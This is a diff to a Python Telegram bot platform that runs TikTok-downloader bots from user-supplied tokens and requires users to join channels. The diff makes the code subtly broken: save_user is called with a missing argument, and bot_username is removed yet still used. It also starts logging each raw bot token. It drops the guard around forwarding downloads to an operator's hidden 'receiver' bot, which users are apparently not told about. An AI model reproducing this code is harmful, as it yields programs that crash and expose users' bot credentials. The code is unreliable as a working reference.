@@ -50,7 +50,7 @@ def system_status():
         data.get("channels_status", True)
     )
 
-# ================= SAVE USER (FIXED 💥) =================
+# ================= SAVE USER =================
 def save_user(user, bot_username):
     users_collection.update_one(
         {"user_id": user.id},
@@ -58,7 +58,7 @@ def save_user(user, bot_username):
             "$set": {
                 "user_id": user.id,
                 "username": user.username or "",
-                "bot": bot_username
+                "bot": bot_username   # 💥 THIS IS THE FIX
             }
         },
         upsert=True
@@ -142,7 +142,7 @@ def get_tiktok(url):
     except:
         return None
 
-# ================= PROCESS DOWNLOAD =================
+# ================= PROCESS =================
 def process_download(bot, chat_id, uid, url):
 
     bots_status, _, _ = system_status()
@@ -155,13 +155,9 @@ def process_download(bot, chat_id, uid, url):
 
     not_joined = check_force_join(bot, uid)
 
-    if not not_joined:
-        pass
-    else:
+    if not_joined:
         return send_join(bot, chat_id, not_joined, url)
 
-    # 🔥 typing effect
-    bot.send_chat_action(chat_id, "typing")
     bot.send_message(chat_id, "⚡ Downloading...")
 
     result = get_tiktok(url)
@@ -184,23 +180,24 @@ def process_download(bot, chat_id, uid, url):
 
         video_url = result["media"]
 
-        # 🔥 uploading effect
-        bot.send_chat_action(chat_id, "upload_video")
-
+        # USER SEND
         bot.send_video(
-            chat_id,
-            video_url,
-            caption=f"Via: @{bot_username}",
-            supports_streaming=True
+    chat_id,
+    video_url,
+    caption=f"Via: @{bot_username}",
+    supports_streaming=True
         )
 
-        bot.send_message(chat_id, "CREATED: @Verify_yourbot")
+        bot.send_message(
+    chat_id,
+    "CREATED: @Verify_yourbot"
+        )
 
-        # RECEIVER
+        # RECEIVER CHECK
         receiver_data = system_collection.find_one({"name": "receiver"})
         receive_on = True if not receiver_data else receiver_data.get("status", True)
 
-        if receive_on and RECEIVER_TOKEN:
+        if receive_on:
             try:
                 receiver_bot = telebot.TeleBot(RECEIVER_TOKEN)
 
@@ -220,7 +217,6 @@ def process_download(bot, chat_id, uid, url):
     elif result["type"] == "photo":
 
         for img in result["media"]:
-            bot.send_chat_action(chat_id, "upload_photo")
             bot.send_photo(chat_id, img)
 
     # ================= SAVE =================
@@ -237,24 +233,21 @@ def start_user_bot(token):
     try:
         bot = telebot.TeleBot(token, parse_mode="HTML")
 
-        # 🔥 delete webhook
+        # webhook delete (strong)
         try:
             requests.get(f"https://api.telegram.org/bot{token}/deleteWebhook")
         except:
             pass
 
-        bot_username = bot.get_me().username
+        # ================= HANDLERS =================
 
-        # ================= START =================
         @bot.message_handler(commands=["start"])
         def start(message):
 
-            save_user(message.from_user, bot_username)
+            save_user(message.from_user)
 
             kb = ReplyKeyboardMarkup(resize_keyboard=True)
             kb.add(KeyboardButton("Create your bot"))
-
-            bot.send_chat_action(message.chat.id, "typing")
 
             bot.send_message(
                 message.chat.id,
@@ -273,12 +266,6 @@ CREATED: @Verify_yourbot""",
                 reply_markup=kb
             )
 
-        # ================= AUTO SAVE ALL USERS 💥 =================
-        @bot.message_handler(func=lambda m: True, content_types=["text","photo","video"])
-        def auto_save(message):
-            save_user(message.from_user, bot_username)
-
-        # ================= CREATE BOT =================
         @bot.message_handler(func=lambda m: m.text == "Create your bot")
         def create_bot(message):
 
@@ -296,11 +283,8 @@ CREATED: @Verify_yourbot""",
                 reply_markup=kb
             )
 
-        # ================= HANDLE LINK =================
         @bot.message_handler(func=lambda m: m.text and "tiktok.com" in m.text)
         def handle(message):
-
-            bot.send_chat_action(message.chat.id, "typing")
 
             download_pool.submit(
                 process_download,
@@ -310,7 +294,6 @@ CREATED: @Verify_yourbot""",
                 message.text.strip()
             )
 
-        # ================= CONFIRM JOIN =================
         @bot.callback_query_handler(func=lambda call: call.data == "confirm_join")
         def confirm_join(call):
 
@@ -338,25 +321,22 @@ CREATED: @Verify_yourbot""",
                 bot.answer_callback_query(call.id, "❌ Join all", show_alert=True)
 
         # ================= START POLLING =================
+
         running_bots[token] = bot
 
-        print(f"🟢 @{bot_username} RUNNING")
+        print("🟢 Bot Running:", token)
 
-        bot.infinity_polling(
-            skip_pending=True,
-            timeout=60,
-            long_polling_timeout=60
-        )
+        bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
 
     except Exception as e:
         print("❌ Bot crash:", token, e)
 
     finally:
         if token in running_bots:
-            del running_bots[token)
+            del running_bots[token]
 
 
-# ================= RUNNER LOOP =================
+# ================= RUNNER =================
 starting_tokens = set()
 
 def runner_loop():
@@ -433,31 +413,9 @@ def runner_loop():
         time.sleep(3)
 
 
-# ================= BACKGROUND CLEAN =================
-def clean_users():
-    while True:
-        try:
-            for u in users_collection.find():
-                if not u.get("user_id"):
-                    users_collection.delete_one({"_id": u["_id"]})
-        except Exception as e:
-            print("Clean error:", e)
-
-        time.sleep(300)
-
-
-# ================= HEARTBEAT =================
-def heartbeat():
-    while True:
-        print("💓 SYSTEM RUNNING...")
-        time.sleep(30)
-
-
 # ================= START SYSTEM =================
 def start_system():
     threading.Thread(target=runner_loop, daemon=True).start()
-    threading.Thread(target=clean_users, daemon=True).start()
-    threading.Thread(target=heartbeat, daemon=True).start()
 
 
 # ================= MAIN =================
